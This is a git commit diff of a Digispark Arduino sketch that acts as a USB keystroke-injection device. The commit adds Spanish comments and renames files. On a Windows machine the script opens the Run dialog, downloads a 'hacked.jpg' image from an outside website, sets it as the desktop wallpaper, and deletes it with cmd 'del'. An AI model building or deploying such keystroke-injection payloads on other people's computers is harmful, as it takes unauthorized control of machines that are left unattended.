8d170ab6074f3e9c751b6bbf5a8a4561f665479e
Diego Liberato <diegoliberato16@hotmail.com>
2017-08-05 23:22:57 -0500

    Update Project1.ino

--- Project1.ino
+++ Project1.ino
@@ -9,25 +9,31 @@ void loop(){
 #define KEY_DOWN_ARROW   0x51
 DigiKeyboard.sendKeyStroke(0); 
 DigiKeyboard.delay(3000);
+  //Abre cmd
 DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
 DigiKeyboard.delay(1000);
 DigiKeyboard.print("http>&&codingconcepts.biz&wp/content&uploads&2015&05&hacked.jpg");
 DigiKeyboard.delay(1000);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(2000);
+  //Abre la ventana para guardar
 DigiKeyboard.sendKeyStroke(KEY_S,MOD_CONTROL_LEFT);
 DigiKeyboard.delay(1000);
 DigiKeyboard.print("%userprofile%");
 DigiKeyboard.delay(1000);
+  //Entra a la carpeta principal del usuario
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(1000);
+  //Entra al escritorio
 DigiKeyboard.print("Desktop");
 DigiKeyboard.delay(1000);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
-DigiKeyboard.print("QUACKED");
+  //Guarda la imagen como "JE"
+DigiKeyboard.print("JE");
 DigiKeyboard.delay(1000);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(1000);
+  //Ahora toca abrir la imagen
 DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
 DigiKeyboard.delay(1000);
 DigiKeyboard.print("cmd");
@@ -40,10 +46,11 @@ DigiKeyboard.print("Desktop");
 DigiKeyboard.delay(1000);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(1000);
-DigiKeyboard.print("QUACKED.jpg");
+DigiKeyboard.print("JE.jpg");
 DigiKeyboard.delay(1000);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(1000);
+  //Se navega hasta llegar a la opcion de "Establecer como fondo"
 DigiKeyboard.sendKeyStroke(KEY_Tab);
 DigiKeyboard.delay(1000);
 DigiKeyboard.sendKeyStroke(KEY_Tab);
@@ -86,6 +93,7 @@ DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT);
 DigiKeyboard.delay(1000);
 DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT); 
 DigiKeyboard.delay(1000);
+  //Ahora toca eliminar la imagen
 DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
 DigiKeyboard.delay(1000);
 DigiKeyboard.print("cmd");
@@ -106,7 +114,7 @@ DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(1000);
 DigiKeyboard.print("del");
 DigiKeyboard.print(" ");
-DigiKeyboard.print("QUACKED.jpg");
+DigiKeyboard.print("JE.jpg");
 DigiKeyboard.delay(1000);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(1000);
